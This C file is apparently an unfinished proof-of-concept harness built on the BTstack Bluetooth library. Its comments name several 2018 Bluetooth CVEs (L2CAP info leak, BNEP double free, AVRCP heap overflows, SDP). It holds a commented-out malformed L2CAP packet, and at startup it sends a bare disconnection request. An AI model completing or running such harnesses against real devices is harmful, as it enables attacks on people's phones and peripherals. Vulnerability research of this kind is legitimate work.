/**
 * SDP scan and connect to l2cap channels
 */

#define __BTSTACK_FILE__ "sdp_general_query.c"

#include "btstack_config.h"
#include "l2cap_signaling.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "l2cap.h"
#include "btstack.h"

bd_addr_t remote_addr;

int record_id = -1;
int attribute_id = -1;

static uint8_t   attribute_value[1000];
static const int attribute_value_buffer_size = sizeof(attribute_value);
static btstack_packet_callback_registration_t hci_event_callback_registration;

static void packet_handler (uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size);
static void handle_sdp_client_query_result(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size);

static void client_init(void){
    // init L2CAP
    l2cap_init();

    // register for HCI events
    hci_event_callback_registration.callback = &packet_handler;
    hci_add_event_handler(&hci_event_callback_registration);
}

static void do_l2cap_connect(int psm);

typedef struct {
    uint16_t psm;
    uint16_t remote_cid;
    uint16_t local_cid;
    uint16_t handle;
} poc_channel_t;

static poc_channel_t channel;

static void handle_hci_event_packet(uint8_t packet_type, uint16_t l2cap_cid, uint8_t *packet, uint16_t size) {
    bd_addr_t event_addr;
    uint16_t event = hci_event_packet_get_type(packet);
    uint16_t pos = 0;
    switch (event) {
        case L2CAP_EVENT_CHANNEL_OPENED:
            l2cap_event_channel_opened_get_address(packet, &event_addr);
            channel.psm       = l2cap_event_channel_opened_get_psm(packet); 
            channel.local_cid = l2cap_event_channel_opened_get_local_cid(packet); 
            channel.remote_cid = l2cap_event_channel_opened_get_remote_cid(packet); 
            channel.handle    = l2cap_event_channel_opened_get_handle(packet);
            if (l2cap_event_channel_opened_get_status(packet)) {
                printf("Connection failed: psm[0x%x]\n", channel.psm);
            } else {
                printf("Connected: psm[0x%x]\n", channel.psm);
            }
            l2cap_request_can_send_now_event(l2cap_cid);
            break;
        case L2CAP_EVENT_CHANNEL_CLOSED:
            printf("Disconnected\n");
            break;
        case L2CAP_EVENT_CAN_SEND_NOW:
            // handle L2CAP data packet
            l2cap_reserve_packet_buffer();
            uint8_t *buffer = l2cap_get_outgoing_buffer();

            // cve-2018-9419 - info leak via ble?

            // cmd_code == l2cap_cmd_disc_req
            /*
            buffer[0] = 0x06;

            // id
            buffer[1] = 0x00;

            // cmd_len
            buffer[2] = 0x00;
            buffer[3] = 0x00;
            */

            // cve-2018-9356 - bnep double free

            // cve-2018-13281 - avrcp heap overflow

            // cve-2018-13266 - avrcp 
            // cve-2018-13267 - avrcp 
            // cve-2018-13281 - avrcp 
            // cve-2018-13282 - avrcp 
            // cve-2018-13283 - avrcp 
            // cve-2018-13291 - avrcp 

            // cve-2018-9478 - sdp

            // some others from doc on other computer

            //int err = l2cap_send_prepared(l2cap_cid, pos);
            //printf("Error: %d\n", err);
            break;
        default:
            printf("handle_hci_event_packet: 0x%x\n", event);
    }
}

static void l2cap_packet_handler(uint8_t packet_type, uint16_t l2cap_cid, uint8_t *packet, uint16_t size) {
    printf("l2cap_packet_handler: packet_type[%d] l2cap_cid[%d]\n", packet_type, l2cap_cid);
    switch (packet_type) {
        case HCI_EVENT_PACKET:
            handle_hci_event_packet(packet_type, l2cap_cid, packet, size);
    }
}

static void do_l2cap_connect(int psm) {
    uint8_t status = l2cap_create_channel(l2cap_packet_handler, remote_addr, psm, l2cap_max_mtu(), NULL);
    printf("Status: %d\n", status);
}


static void assertBuffer(int size){
    if (size > attribute_value_buffer_size){
        printf("SDP attribute value buffer size exceeded: available %d, required %d", attribute_value_buffer_size, size);
    }
}

static void packet_handler (uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size){
    UNUSED(channel);
    UNUSED(size);

    if (packet_type != HCI_EVENT_PACKET) return;
    uint8_t event = hci_event_packet_get_type(packet);

    switch (event) {
        case BTSTACK_EVENT_STATE:
            // BTstack activated, get started 
            if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING){
                // do_l2cap_connect(0x1);
                uint8_t *buffer = l2cap_get_outgoing_buffer();
                l2cap_send_signaling_packet( buffer, DISCONNECTION_REQUEST,
                    l2cap_next_sig_id(), 0, 0);   
            }
            break;
        default:
            // printf("packet_handler: 0x%x\n", event);
            break;
    }
}

int btstack_main(int argc, const char * argv[]);
int btstack_main(int argc, const char * argv[]){
    (void)argc;
    (void)argv;
    
    printf("Client HCI init done\r\n");
    
    client_init();

    // turn on!
    hci_power_control(HCI_POWER_ON);
            
    return 0;
}
